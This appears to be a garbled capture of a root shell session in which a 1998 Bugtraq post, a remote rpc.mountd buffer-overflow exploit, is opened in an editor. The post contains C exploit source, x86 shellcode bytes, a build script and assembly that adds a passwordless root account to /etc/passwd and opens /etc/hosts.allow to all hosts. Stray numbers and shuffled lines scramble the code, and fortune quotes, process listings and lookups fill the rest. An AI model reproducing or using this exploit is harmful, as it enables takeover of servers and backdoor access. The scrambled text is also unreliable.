+competition; if you want to use computer programs that conform to Apple's
+orthodoxy, you must buy a computer made and sold by Apple itself.
+		-- Edward Mendelson, "The New Republic", February 22, 1988
+
+Try cd...
+
+[root@ariel .Fone]# j
+
+.html 
+
+essing '/usr/lib/joe/joerc'...done
+    IW   msg01912.html                Row 1    Col 1   11:17  Ctrl-K H for help
+<!-- X-URL: http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html -->
+<!-- Date: Thu, 23 Nov 2000 18:29:07 GMT -->
+<BASE HREF="http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html">
+
+<!-- MHonArc v2.1.0 -->
+<!--X-Subject: rpc.mountd exploit -->
+<!--X-From: Hudin Lucian <luci@TRANSART.RO> -->
+<!--X-Date: Wed, 30 Sep 1998 00:07:59 +0300 -->
+<!--X-Message-Id: Pine.LNX.3.96.980930000655.10073A&#45;100000@wild.transart.ro
+<!--X-ContentType: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>rpc.mountd exploit</TITLE>
+<LINK REV="made" HREF="mailto:luci@TRANSART.RO">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+
+(Modified)
+<HR>
+[<A HREF="msg01913.html">Date Prev</A>][<A HREF="msg01915.html">Date Next</A>][
+
+<!--X-TopPNI-End-->
+
+<!--X-MsgBody-->
+
+<!--X-Subject-Header-Begin-->
+
+<H1>rpc.mountd exploit</H1>
+
+<HR>
+<!--X-Subject-Header-End-->
+
+<UL>
+
+<LI><em>To</em>: <A HREF="mailto:BUGTRAQ@netspace.org">BUGTRAQ@netspace.org</A>
+
+<LI><em>Subject</em>: rpc.mountd exploit</LI>
+
+<LI><em>From</em>: Hudin Lucian &lt;<A HREF="mailto:luci@TRANSART.RO">luci@TRAN
+<LI><em>Date</em>: Wed, 30 Sep 1998 00:07:59 +0300</LI>
+
+<LI><em>Approved-By</em>: route@RESENTMENT.INFONEXUS.COM</LI>
+
+<LI><em>Reply-To</em>: Hudin Lucian &lt;<A HREF="mailto:luci@TRANSART.RO">luci@
+
+<LI><em>Sender</em>: Bugtraq List &lt;<A HREF="mailto:BUGTRAQ@netspace.org">BUG
+</UL>
+8
+
+<!--X-Head-Body-Sep-Begin-->
+
+<HR>
+
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+/*
+
+    rpc.mountd [remote] exploit by LucySoft [ luci@transart.ro ]
+
+    [September 20, 1998]
+
+    [version 0.4]
+
+    tested on Red Hat Linux 5.1 (Manhattan)
+
+    running nfs-server-2.2beta29
+
+    I guess patches are available at <A HREF="ftp://ftp.redhat.com">ftp://ftp.r
+
+    NOTE: if the remote host has /etc/exporfs non-empty,
+
+    [shwomount -e remote_host]
+
+    you must define __EXPORTS 2 and recompile
+
+    I've tested on only two RH 5.1 systems, the offset was about 1000.
+
+*/
+
+#define __EXPORTFS	1
+
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#include &lt;errno.h&gt;
+
+#include &lt;netdb.h&gt;
+
+#include &lt;rpc/rpc.h&gt;
+
+#include &lt;rpc/pmap_prot.h&gt;
+
+#include &lt;rpc/pmap_clnt.h&gt;
+
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/time.h&gt;
+
+#include &lt;sys/utsname.h&gt;
+
+#include &lt;sys/stat.h&gt;
+
+#include &lt;arpa/inet.h&gt;
+
+#include &lt;linux/nfs.h&gt;
+
+#include "nfsmount.h"
+
+2
+
+3
+
+4
+
+5
+6
+7
+8
+9
+10
+1
+2
+3
+4
+5
+6
+7
+8
+9
+20
+1
+2
+3
+
+4
+5
+6
+
+7
+/*
+static unsigned long		__offset = 1160;
+
+8
+9
+30
+
+1
+static char code[] =check out code.c if you want to know what this means
+*/
+
+2
+3
+
+40x56, 0x56, 0x31, 0xd2,
+{
+   0xeb, 0x56, 0x5e, 0x56,
+5
+6
+7
+
+80x27, 0x88, 0x56, 0x38,0x88, 0x56, 0x0b, 0x88,
+0x56, 0x1e, 0x88, 0x56,
+
+9
+40
+1
+
+20xb2, 0x0a, 0x88, 0x56,
+0x1d, 0x88, 0x56, 0x26,
+0x5b, 0x31, 0xc9, 0x41,
+3
+4
+
+50x89, 0xc3, 0x31, 0xc9,0x41, 0x31, 0xc0, 0xb0,
+0x05, 0xcd, 0x80, 0x50,
+6
+7
+8
+
+90xcd, 0x80, 0x58, 0x89,0x31, 0xd2, 0xb2, 0x02,
+
+0x31, 0xc0, 0xb0, 0x13,
+50
+1
+
+20xc2, 0x89, 0xc3, 0x59,
+0x52, 0x31, 0xd2, 0xb2,
+3
+4
+5
+
+60x12, 0xcd, 0x80, 0x5b,0x0c, 0x01, 0xd1, 0xb2,
+0x13, 0x31, 0xc0, 0xb0,
+0x04, 0x31, 0xd2, 0xb2,
+7
+8
+
+90xcd, 0x80, 0xeb, 0x3f,0x31, 0xc0, 0xb0, 0x06,
+60
+1
+2
+
+30x63, 0x2f, 0x70, 0x61,0xe8, 0xa5, 0xff, 0xff,
+0xff, 0x2f, 0x65, 0x74,
+
+4
+5
+6
+
+70x73, 0x73, 0x77, 0x64,
+0x78, 0x7a, 0x3a, 0x3a,
+0x30, 0x3a, 0x30, 0x3a,
+8
+9
+
+700x73, 0x68, 0x78, 0x78,0x3a, 0x2f, 0x3a, 0x2f,
+0x62, 0x69, 0x6e, 0x2f,
+1
+2
+3
+
+40x78, 0x2f, 0x65, 0x74,0x41, 0x4c, 0x4c, 0x3a,
+
+0x41, 0x4c, 0x4c, 0x78,
+5
+6
+7
+
+80x61, 0x6c, 0x6c, 0x6f,0x63, 0x2f, 0x68, 0x6f,
+0x73, 0x74, 0x73, 0x2e,
+
+9
+80
+
+10x28, 0x01, 0xcb, 0xb1,0x77, 0x78, 0xff, 0x5b,
+0x53, 0x31, 0xc9, 0xb1,
+2
+3
+4
+
+50x89, 0xc3, 0x31, 0xc9,0x02, 0x31, 0xc0, 0xb0,
+0x05, 0xcd, 0x80, 0x50,
+6
+7
+
+80x31, 0xc0, 0xb0, 0x13,0x31, 0xd2, 0xb2, 0x02,
+
+9
+90
+1
+
+20xcd, 0x80, 0x5b, 0x59,
+0x53, 0x31, 0xd2, 0xb2,
+0x1f, 0x01, 0xd1, 0xb2,
+3
+4
+
+50x31, 0xc0, 0xb0, 0x06,0x08, 0x31, 0xc0, 0xb0,
+0x04, 0xcd, 0x80, 0x5b,
+6
+7
+
+8
+};  0xcd, 0x80, 0x31, 0xc0,
+0x40, 0xcd, 0x80
+9
+100
+1
+
+2
+unsigned long get_esp()
+3
+4
+
+5
+}{
+  __asm__("movl %esp,%eax");
+6
+7
+8
+
+9
+{void _fill_hostile_buffer(char *ptr)
+10
+1
+
+2int		length;char	*buff;
+unsigned	retaddr = get_esp() + __offset;
+3
+4
+5
+
+6length = strlen(code);memset(ptr, 0x90, 1024);
+
+7
+8
+
+9buff = ptr + 1024 - 40 - __EXPORTFS;memcpy(ptr + 1024 - length - 40 - __EXPORTFS, code, length);
+20
+1
+2
+
+3*(unsigned*)buff = (unsigned)retaddr;while (buff &lt; (ptr + 1024))
+{
+4
+5
+6
+
+7buff += sizeof(unsigned);
+}
+ptr[1023] = '\0';
+8
+9
+
+30
+}   fprintf(stderr, "code length = %d, used retaddr is %x\n", length, retaddr);
+
+1
+2
+3
+
+4
+*/
+/*
+  ripped off from nfsmount.c [ mount-2.7l.rpm - RH 5.1 ]
+5
+6
+7
+
+8
+{int _nfsmount(char* hostname, char *dirname)
+9
+40
+
+1int	nfsprog, nfsvers;
+	CLIENT  *mclient;
+	int	mountprog, mountvers;
+2
+3
+4
+
+5int	mountport = 0;
+	int	clnt_stat;
+	int	msock, fsock;
+6
+7
+8
+
+9struct  timeval total_timeout, retry_timeout;
+	struct  hostent *hp;
+	struct  sockaddr_in server_addr;
+	struct  fhstatus status;
+
+H50
+
+H1
+2
+3
+4
+5
+6
+7
+8
+9
+60
+1
+2
+
+3mountprog = MOUNTPROG;if (!(hp = gethostbyname(hostname)))
+	{
+   fprintf(stderr, "mx: can't get address for %s\n", hostname);
+return(-1);
+	}
+
+server_addr.sin_family = AF_INET;
+	memcpy(&amp;server_addr.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);
+
+4mountvers = MOUNTVERS;
+
+5
+
+6nfsprog = NFS_PROGRAM;
+7
+
+8nfsvers = NFS_VERSION;
+9
+70
+1
+
+2retry_timeout.tv_usec = 0;
+	total_timeout.tv_usec = 0;
+	total_timeout.tv_sec = 20;
+
+3
+4
+
+5server_addr.sin_port = htons(mountport);
+	retry_timeout.tv_sec = 3;
+
+6
+7
+
+8fprintf(stderr, "ok, attacking target %s\n", hp-&gt;h_name);
+	msock = RPC_ANYSOCK;
+
+9
+80
+1
+
+2retry_timeout, &amp;msock);
+	mclient = clntudp_create(&amp;server_addr,
+mountprog, mountvers,
+3
+4
+
+5{if (mclient)
+6
+7
+8
+
+9(xdrproc_t) xdr_fhstatus, (caddr_t) &amp;status,mclient-&gt;cl_auth = authunix_create_default();
+clnt_stat = clnt_call(mclient, MOUNTPROC_MNT,
+		(xdrproc_t) xdr_dirpath, (caddr_t) &amp;dirname,
+90
+1
+2
+
+3{	total_timeout);
+
+if (clnt_stat != RPC_SUCCESS)
+4
+5
+6
+
+7clnt_destroy(mclient);
+		/*
+
+auth_destroy(mclient-&gt;cl_auth);
+8
+9
+
+200clnt_perror(mclient, "mx clnt_call");
+		close(msock);
+
+1
+2
+3
+
+4fprintf(stderr, "successful clnt_call\n");
+		*/
+return(msock);
+}
+5
+6
+7
+
+8{   return(msock);
+	}
+else
+9
+10
+
+1}   clnt_pcreateerror("mx clntudp_create");
+return(-1);
+2
+3
+
+4auth_destroy(mclient-&gt;cl_auth);
+5
+6
+7
+
+8
+}	clnt_destroy(mclient);
+	close(msock);
+	return (-1);
+9
+20
+
+1
+int main(int argc, char *argv[])
+2
+3
+4
+
+5
+{
+   int		k, sock;
+char	hostilebuffer[4096];
+6
+7
+
+8{if (argc &lt; 2)
+9
+30
+1
+
+2fprintf(stderr, "usage : %s target_host [offset]\n", argv[0]);
+	return(-1);
+}
+3
+4
+
+5__offset = strtol(argv[2], (char**)NULL, 10);if (argc == 3)
+{
+6
+7
+8
+
+9_fill_hostile_buffer(hostilebuffer);
+	fprintf(stderr, "using offset %d\n", __offset);
+}
+
+40
+1
+
+2fprintf(stderr, "seems that security on host %s was defeated\n",if (_nfsmount(argv[1], hostilebuffer) &gt; 0)
+{
+3
+4
+5
+
+6return(0);argv[1]);
+}
+
+7
+8
+9
+
+50
+-------------------------------------------------------------------------
+}
+
+1
+2
+
+3
+CUT_HERE next file is nfsmount.x
+-------------------------------------------------------------------------
+4
+5
+
+6
+% * unrestricted use provided that this legend is included on all tape
+%/*
+% * Sun RPC is a product of Sun Microsystems, Inc. and is provided for
+7
+8
+9
+
+60
+% * program developed by the user or with the express written consent of
+% * media and as a part of the software program in whole or part.  Users
+% * may copy or modify Sun RPC without charge, but are not authorized
+% * to license or distribute it to anyone else except as part of a product or
+1
+2
+3
+
+4
+% * WARRANTIES OF DESIGN, MERCHANTIBILITY AND FITNESS FOR A PARTICULAR
+% * Sun Microsystems, Inc.
+% *
+% * SUN RPC IS PROVIDED AS IS WITH NO WARRANTIES OF ANY KIND INCLUDING THE
+5
+6
+7
+
+8
+% * part of Sun Microsystems, Inc. to assist in its use, correction,
+% * PURPOSE, OR ARISING FROM A COURSE OF DEALING, USAGE OR TRADE PRACTICE.
+% *
+% * Sun RPC is provided with no support and without any obligation on the
+
+9
+% * modification or enhancement.
+
+H8
+7
+6
+5
+4
+3
+2
+1
+0
+59
+8
+7
+6
+5
+4
+3
+2
+1
+0
+
+49
+
+8
+
+9
+
+50
+
+% *
+% * SUN MICROSYSTEMS, INC. SHALL HAVE NO LIABILITY WITH RESPECT TO THE
+
+% * INFRINGEMENT OF COPYRIGHTS, TRADE SECRETS OR ANY PATENTS BY SUN RPC
+% * OR ANY PART THEREOF.
+% *
+
+% * In no event will Sun Microsystems, Inc. be liable for any lost revenue
+% * or profits or other special, indirect and consequential damages, even if
+% * Sun has been advised of the possibility of such damages.
+
+% *
+% * Sun Microsystems, Inc.
+% * 2550 Garcia Avenue
+% * Mountain View, California  94043
+
+% */
+
+%/*
+% * Copyright (c) 1985, 1990 by Sun Microsystems, Inc.
+
+% */
+%
+%/* from @(#)mount.x	1.3 91/03/11 TIRPC 1.0 */
+
+/*
+* Protocol description for the mount program
+ */
+
+#ifdef RPC_HDR
+%#ifndef _rpcsvc_mount_h
+
+%#define _rpcsvc_mount_h
+#endif
+
+#ifdef RPC_CLNT
+%#include &lt;string.h&gt;/* for memset() */
+#endif
+
+const MNTPATHLEN = 1024;	/* maximum bytes in a pathname argument */
+const MNTNAMLEN = 255;		/* maximum bytes in a name argument */
+const FHSIZE = 32;		/* size in bytes of a file handle */
+
+/*
+
+ * The fhandle is the file handle that the server passes to the client.
+ * All file operations are done using the file handles to refer to a file
+ * or a directory. The file handle can contain whatever information the
+ * server needs to distinguish an individual file.
+
+ */
+typedef opaque fhandle[FHSIZE];
+
+/*
+* If a status of zero is returned, the call completed successfully, and
+ * a file handle for the directory follows. A non-zero status indicates
+ * some sort of error. The status corresponds with UNIX error numbers.
+
+ */
+union fhstatus switch (unsigned fhs_status) {
+case 0:
+
+	fhandle fhs_fhandle;
+default:
+void;
+};
+
+/*
+* The type dirpath is the pathname of a directory
+ */
+
+typedef string dirpath&lt;MNTPATHLEN&gt;;
+
+/*
+
+ * The type name is used for arbitrary names (hostnames, groupnames)
+ */
+typedef string name&lt;MNTNAMLEN&gt;;
+
+/*
+* A list of who has what mounted
+
+ */
+typedef struct mountbody *mountlist;
+struct mountbody {
+	name ml_hostname;
+
+	dirpath ml_directory;
+	mountlist ml_next;
+};
+
+/*
+* A list of netgroups
+
+ */
+typedef struct groupnode *groups;
+struct groupnode {
+	name gr_name;
+	groups gr_next;
+};
+
+/*
+* A list of what is exported and to whom
+ */
+typedef struct exportnode *exports;
+struct exportnode {
+
+	dirpath ex_dir;
+	groups ex_groups;
+	exports ex_next;
+};
+
+/*
+* POSIX pathconf information
+
+ */
+struct ppathcnf {
+	int	pc_link_max;	/* max links allowed */
+
+	short   pc_max_canon;   /* max line len for a tty */
+	short   pc_max_input;   /* input a tty can eat all at once */
+	short   pc_name_max;	/* max file name length (dir entry) */
+	short   pc_path_max;	/* max path name length (/x/y/x/.. ) */
+
+	short   pc_pipe_buf;	/* size of a pipe (bytes) */
+	u_char  pc_vdisable;	/* safe char to turn off c_cc[i] */
+	char	pc_xxx;		/* alignment padding; cc_t == char */
+
+	short   pc_mask[2];	/* validity and boolean bits */
+};
+
+program MOUNTPROG {
+
+	/*
+* Version one of the mount protocol communicates with version two
+	 * of the NFS protocol. The only connecting point is the fhandle
+	 * structure, which is the same for both protocols.
+
+	 */
+	version MOUNTVERS {
+		/*
+
+		 * Does no work. It is made available in all RPC services
+		 * to allow server reponse testing and timing
+		 */
+void
+
+		MOUNTPROC_NULL(void) = 0;
+
+		/*
+
+		 * If fhs_status is 0, then fhs_fhandle contains the
+		 * file handle for the directory. This file handle may
+		 * be used in the NFS protocol. This procedure also adds
+		 * a new entry to the mount list for this client mounting
+
+		 * the directory.
+		 * Unix authentication required.
+		 */
+
+		fhstatus
+		MOUNTPROC_MNT(dirpath) = 1;
+
+		/*
+
+		 * Returns the list of remotely mounted filesystems. The
+		 * mountlist contains one entry for each hostname and
+		 * directory pair.
+
+		 */
+mountlist
+		MOUNTPROC_DUMP(void) = 2;
+
+		/*
+* Removes the mount list entry for the directory
+		 * Unix authentication required.
+
+		 */
+void
+		MOUNTPROC_UMNT(dirpath) = 3;
+
+		/*
+* Removes all of the mount list entries for this client
+
+		 * Unix authentication required.
+		 */
+void
+
+		MOUNTPROC_UMNTALL(void) = 4;
+
+		/*
+
+		 * Returns a list of all the exported filesystems, and which
+		 * machines are allowed to import it.
+		 */
+exports
+
+		MOUNTPROC_EXPORT(void)  = 5;
+
+		/*
+
+		 * Identical to MOUNTPROC_EXPORT above
+		 */
+exports
+
+		MOUNTPROC_EXPORTALL(void) = 6;
+	} = 1;
+
+	/*
+* Version two of the mount protocol communicates with version two
+	 * of the NFS protocol.
+	 * The only difference from version one is the addition of a POSIX
+
+	 * pathconf call.
+	 */
+	version MOUNTVERS_POSIX {
+
+		/*
+* Does no work. It is made available in all RPC services
+		 * to allow server reponse testing and timing
+
+		 */
+void
+		MOUNTPROC_NULL(void) = 0;
+
+		/*
+* If fhs_status is 0, then fhs_fhandle contains the
+		 * file handle for the directory. This file handle may
+
+		 * be used in the NFS protocol. This procedure also adds
+		 * a new entry to the mount list for this client mounting
+		 * the directory.
+
+		 * Unix authentication required.
+		 */
+fhstatus
+		MOUNTPROC_MNT(dirpath) = 1;
+
+		/*
+* Returns the list of remotely mounted filesystems. The
+
+		 * mountlist contains one entry for each hostname and
+		 * directory pair.
+		 */
+mountlist
+
+		MOUNTPROC_DUMP(void) = 2;
+
+		/*
+
+		 * Removes the mount list entry for the directory
+		 * Unix authentication required.
+		 */
+
+		void
+		MOUNTPROC_UMNT(dirpath) = 3;
+
+		/*
+* Removes all of the mount list entries for this client
+		 * Unix authentication required.
+		 */
+
+		void
+		MOUNTPROC_UMNTALL(void) = 4;
+
+		/*
+* Returns a list of all the exported filesystems, and which
+		 * machines are allowed to import it.
+
+		 */
+exports
+		MOUNTPROC_EXPORT(void)  = 5;
+
+		/*
+* Identical to MOUNTPROC_EXPORT above
+		 */9
+
+5;24r
+
+		exports
+		MOUNTPROC_EXPORTALL(void) = 6;
+
+		/*
+* POSIX pathconf info (Sun hack)
+		 */
+ppathcnf
+		MOUNTPROC_PATHCONF(dirpath) = 7;
+	} = 2;
+} = 100005;
+
+#ifdef RPC_HDR
+
+%#endif /*!_rpcsvc_mount_h*/
+#endif
+
+------------------------------------------------------------------------
+CUT_HERE : next file is makeit [ script for building the stuff ]
+
+------------------------------------------------------------------------
+
+#!/bin/bash
+
+rpcgen -C nfsmount.x
+gcc -c -g nfsmount.c
+
+gcc -o mx nfsmount.o nfsmount_xdr.c
+
+---------------------------------------------------------------------------
+CUT_HERE : next file is the asm code... just to have the entire source code
+---------------------------------------------------------------------------
+
+/*
+
+really ugly code. It does :
+
+  int fd = open("/etc/passwd", O_RDWR);
+  lseek(fd, 0, SEEK_END);
+  write(fd, "z::0:0::/:/bin/sh\n", 18);
+  close(fd);
+
+  int fd = open("/etc/hosts.allow", O_RDWR);
+  lseek(fd, 0, SEEK_END);
+  write(fd, "ALL:ALL\n", 8);
+
+  close(fd);
+
+  exit(?);
+
+*/
+
+#include &lt;stdio.h&gt;
+
+main()
+{
+
+__asm__("jmp eofcode
+here:
+popl %esi
+
+pushl %esi
+pushl %esi
+pushl %esi
+
+xorl %edx, %edx
+movb %dl, 11(%esi)
+
+movb %dl, 30(%esi)
+movb %dl, 39(%esi)
+movb %dl, 56(%esi)
+
+movb $0x0a, %dl
+movb %dl, 29(%esi)
+movb %dl, 38(%esi)
+
+popl %ebx
+xorl %ecx, %ecx
+incl %ecx
+incl %ecx
+
+xor %eax, %eax
+movb $0x05, %al
+int  $0x80
+
+pushl %eax
+
+movl %eax, %ebx
+
+xorl %ecx, %ecx
+xorl %edx, %edx
+movb $0x02, %dl
+
+xorl %eax, %eax
+movb $0x13, %al
+int  $0x80
+
+popl %eax
+
+movl %eax, %edx
+movl %eax, %ebx
+popl %ecx
+
+pushl %edx
+xorl %edx, %edx
+movb $0x0c, %dl
+
+addl %edx, %ecx
+movb $0x13, %dl
+xorl %eax, %eax
+movb $0x04, %al
+
+xorl %edx, %edx
+movb $0x12, %dl
+int  $0x80
+
+popl %ebx
+xorl %eax, %eax
+movb $0x06, %al
+int  $0x80
+
+jmp  cont1
+
+eofcode:
+call here
+
+.string \"/etc/passwdxz::0:0::/:/bin/shxxALL:ALLxx/etc/hosts.allowx
+
+cont1:
+
+popl %ebx
+pushl %ebx
+xorl %ecx, %ecx
+
+movb $40, %cl
+addl %ecx, %ebx
+movb $02, %cl
+
+xor  %eax, %eax
+movb $05, %al
+int  $0x80
+
+pushl %eax
+
+movl %eax, %ebx
+xorl %ecx, %ecx
+xorl %edx, %edx
+
+movb $0x02, %dl
+xorl %eax, %eax
+movb $0x13, %al
+
+int  $0x80
+
+popl %ebx
+
+popl %ecx
+
+pushl %ebx
+
+xorl %edx, %edx
+
+movb $31, %dl
+addl %edx, %ecx
+movb $8, %dl
+
+xorl %eax, %eax
+movb $4, %al
+int  $0x80
+
+popl %ebx
+xorl %eax, %eax
+
+movb $0x06, %al
+int  $0x80
+
+xor  %eax, %eax
+incl %eax
+int  $0x80
+
+.string \"theeeeeeeeeeend\"
+");
+
+}
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg01913.html">Re: rpc.mountd vulnerabilities</A></STRONG>
+
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg01915.html">IRIX On-Line Customer Registration Vulnerabilit
+
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg01903.html">Netscape Cache Exploit - source code</A></STRON
+</LI>
+
+<LI>Next by thread:
+<STRONG><A HREF="msg01915.html">IRIX On-Line Customer Registration Vulnerabilit
+</LI>
+<LI>Index(es):
+
+<UL>
+<LI><A HREF="maillist.html#01912"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#01912"><STRONG>Thread</STRONG></A></LI>
+
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+
+</BODY>
+</HTML>
+
+ame of file to save (^C to abort): msg01912.html 
+
+ 
+
+ 
+
+KFile statd.c savedLose changes to this file (y,n,^C)? 
+File msg01912.html not saved.
+
+Imitation is the sincerest form of plagarism.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# g
+
+atd.c:6: `#include' expects "FILENAME" or <FILENAME>
+statd.c:7: `#include' expects "FILENAME" or <FILENAME>
+statd.c:8: `#include' expects "FILENAME" or <FILENAME>
+statd.c:9: `#include' expects "FILENAME" or <FILENAME>
+statd.c:10: `#include' expects "FILENAME" or <FILENAME>
+statd.c:11: `#include' expects "FILENAME" or <FILENAME>
+statd.c:12: `#include' expects "FILENAME" or <FILENAME>
+statd.c:13: `#include' expects "FILENAME" or <FILENAME>
+statd.c:14: `#include' expects "FILENAME" or <FILENAME>
+statd.c:15: `#include' expects "FILENAME" or <FILENAME>
+statd.c:16: `#include' expects "FILENAME" or <FILENAME>
+statd.c:17: `#include' expects "FILENAME" or <FILENAME>
+statd.c:18: `#include' expects "FILENAME" or <FILENAME>
+statd.c:19: `#include' expects "FILENAME" or <FILENAME>
+statd.c:21: nfsmount.h: No such file or directory
+
+HELP!!!! I'm being held prisoner in /usr/games/lib!
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# .
+
+exi
+
+t
+
+Women who want to be equal to men lack imagination.
+
+Try cd...
+
+[Fone@ariel .Fone]$ s
+
+word: 
+
+Lackland's Laws:
+	(1) Never be first.
+	(2) Never be last.
+	(3) Never volunteer for anything
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# r
+
+It is far more impressive when others discover your good qualities without
+your help.
+		-- Miss Manners
+
+Try cd...
+
+[root@ariel .Fone]# e
+
+t
+
+Monogamy is the Western custom of one wife and hardly any mistresses.
+		-- H.H. Munro
+
+Ho Hum Dee Dum
+
+[Fone@ariel .Fone]$ e
+
+ut
+
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i686
+login: 
+
+sword: 
+
+st night I met upon the stair
+A little man who wasn't there.
+He wasn't there again today.
+Gee how I wish he'd go away!
+
+Ho Hum Dee Dum
+
+[Fone@ariel .Fone]$ s
+
+word: 
+
+ver drink coke in a moving elevator.  The elevator's motion coupled with
+the chemicals in coke produce hallucinations.  People tend to change into
+lizards and attack without warning, and large bats usually fly in the
+window.  Additionally, you begin to believe that elevators have windows.
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# e
+
+         
+
+ID TTY      STAT   TIME COMMAND
+    1 ?        S      0:04 init [3]
+    2 ?        SW     0:00 [kflushd]
+    3 ?        SW     0:00 [kupdate]
+    4 ?        SW     0:00 [kpiod]
+    5 ?        SW     0:00 [kswapd]
+    6 ?        SW<    0:00 [mdrecoveryd]
+  309 ?        S      0:00 /sbin/pump -i eth0
+  377 ?        SW     0:00 [lockd]
+  378 ?        SW     0:00 [rpciod]
+  387 ?        S      0:00 rpc.statd
+  401 ?        S      0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-sc
+  428 ?        S      0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto
+  481 ?        S      0:00 syslogd -m 0
+  490 ?        S      0:00 klogd
+  554 ?        S      0:00 inetd
+  568 ?        S      0:00 smbd -D
+  577 ?        S      0:00 nmbd -D
+  591 ?        S      0:00 lpd
+  639 ?        S      0:00 sendmail: accepting connections on port 25
+  753 ?        S      0:00 /usr/sbin/amd -F /etc/amd.conf
+  795 tty2     S      0:00 /sbin/mingetty tty2
+  796 tty3     S      0:00 /sbin/mingetty tty3
+  797 tty4     S      0:00 /sbin/mingetty tty4
+  798 tty5     S      0:00 /sbin/mingetty tty5
+  799 tty6     S      0:00 /sbin/mingetty tty6
+  802 tty1     S      0:00 /sbin/mingetty tty1
+  961 pts/0    S      0:00 bash
+ 1079 pts/0    S      0:00 joe /bin/w
+ 1103 pts/1    S      0:00 bash
+
+Today is the first day of the rest of the mess.
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# e
+
+ LAR!
+
+In Africa some of the native tribes have a custom of beating the ground
+with clubs and uttering spine chilling cries.  Anthropologists call
+this a form of primitive self-expression.  In America we call it golf.
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# c
+
+      
+
+D TTY      STAT   TIME COMMAND
+    1 ?        S      0:04 init [3]
+    2 ?        SW     0:00 [kflushd]
+    3 ?        SW     0:00 [kupdate]
+    4 ?        SW     0:00 [kpiod]
+    5 ?        SW     0:00 [kswapd]
+    6 ?        SW<    0:00 [mdrecoveryd]
+  309 ?        S      0:00 /sbin/pump -i eth0
+  377 ?        SW     0:00 [lockd]
+  378 ?        SW     0:00 [rpciod]
+  387 ?        S      0:00 rpc.statd
+  401 ?        S      0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-sc
+  428 ?        S      0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto
+  481 ?        S      0:00 syslogd -m 0
+  490 ?        S      0:00 klogd
+  554 ?        S      0:00 inetd
+  568 ?        S      0:00 smbd -D
+  577 ?        S      0:00 nmbd -D
+  591 ?        S      0:00 lpd
+  639 ?        S      0:00 sendmail: accepting connections on port 25
+  753 ?        S      0:00 /usr/sbin/amd -F /etc/amd.conf
+  795 tty2     S      0:00 /sbin/mingetty tty2
+  796 tty3     S      0:00 /sbin/mingetty tty3
+  797 tty4     S      0:00 /sbin/mingetty tty4
+  798 tty5     S      0:00 /sbin/mingetty tty5
+  799 tty6     S      0:00 /sbin/mingetty tty6
+  802 tty1     S      0:00 /sbin/mingetty tty1
+  961 pts/0    S      0:00 bash
+ 1103 pts/1    S      0:00 bash
+
+For most men life is a search for the proper manila envelope in which to
+get themselves filed.
+		-- Clifton Fadiman
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# w
+
+03am  up  2:40,  2 users,  load average: 0.05, 0.01, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  1.00s  0.75s   ?     -
+Fone     pts/1    1Cust44.tnt31.ch 11:01am  0.00s  0.46s   ?     -
+
+I wish a robot would get elected president.  That way, when he came to town,
+we could all take a shot at him and not feel too bad.
+		-- Jack Handley
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# n
+
+er:  serrano.bconnected.net
+Address:  209.53.0.17
+
+Name:    hackers.com
+Address:  216.160.243.27
+
+My pen is at the bottom of a page,
+Which, being finished, here the story ends;
+'Tis to be wished it had been sooner done,
+But stories somehow lengthen when begun.
+		-- Byron
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# p
+
+ yahoo.com (216.115.108.243) from 10.0.1.5 : 56(84) bytes of data.
+64 bytes from img3.yahoo.com (216.115.108.243): icmp_seq=0 ttl=242 time=83.2 ms
+64 bytes from img3.yahoo.com (216.115.108.243): icmp_seq=1 ttl=242 time=82.4 ms
+64 bytes from img3.yahoo.com (216.115.108.243): icmp_seq=2 ttl=242 time=80.8 ms
+64 bytes from img3.yahoo.com (216.115.108.243): icmp_seq=3 ttl=242 time=80.1 ms
+
+--- yahoo.com ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max = 80.1/81.6/83.2 ms
+
+To get back on your feet, miss two car payments.
+
+Try cd...
+
+[root@ariel .Fone]# e
+
+o HAI! WHAT DO YOU WANT ME ON HERE FOR?echo HAI LAR!
+HAI! WHAT DO YOU WANT ME ON HERE FOR?echo HAI LAR!
+
+The gentlemen looked one another over with microscopic carelessness.
+
+Try cd...
+
+[root@ariel .Fone]# w
+
+: missing URL
